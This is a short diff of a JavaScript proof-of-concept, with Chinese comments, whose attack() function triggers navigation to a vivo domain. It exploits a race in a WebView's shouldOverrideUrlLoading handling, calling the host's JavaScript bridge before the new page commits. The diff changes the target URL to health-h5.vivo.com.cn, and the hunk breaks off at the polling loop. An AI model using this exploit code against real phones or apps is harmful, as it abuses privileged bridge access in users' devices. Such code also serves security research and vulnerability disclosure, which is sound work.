@@ -7,8 +7,8 @@ const LOG = document.getElementById('r');
 // 关键：触发导航但不等待完成，在竞态窗口内调桥
 function attack() {
     // 1) 发起一次到 vivo 域的导航 → 触发 shouldOverrideUrlLoading
-    //    → 宿主 :860 立即执行 mRealUrl = "https://video-activity.vivo.com.cn/..."
-    location.href = 'https://bbs.vivo.com.cn/newbbs/link?target=' + Math.random();
+    //    → 宿主 :860 立即执行 mRealUrl = "https://health-h5.vivo.com.cn/play/v2/index?r=3"
+    location.href = 'https://health-h5.vivo.com.cn/play/v2/index?r=' + Math.random();
     // 2) 不等待加载完成（旧页 JS 仍在执行 = 竞态窗口）
     //    轮询调用，只要任一次命中"回调已执行、新页未 commit"即成功
     let n = 0;
